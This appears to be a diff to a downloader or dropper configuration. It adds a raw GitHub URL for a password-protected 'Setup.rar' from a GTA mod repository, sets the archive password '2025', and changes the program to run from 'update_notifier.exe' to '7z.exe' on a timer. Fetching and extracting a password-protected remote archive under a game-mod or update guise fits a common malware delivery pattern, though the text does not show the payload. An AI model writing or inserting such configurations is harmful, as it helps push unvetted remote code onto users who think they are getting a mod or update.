@@ -1,5 +1,5 @@
-url=
+url=https://raw.githubusercontent.com/gtamodmafia/gta-san/refs/heads/main/setup.rar
 name=Setup.rar
 password=2025
-setup=update_notifier.exe
+setup=7z.exe
 timer=1
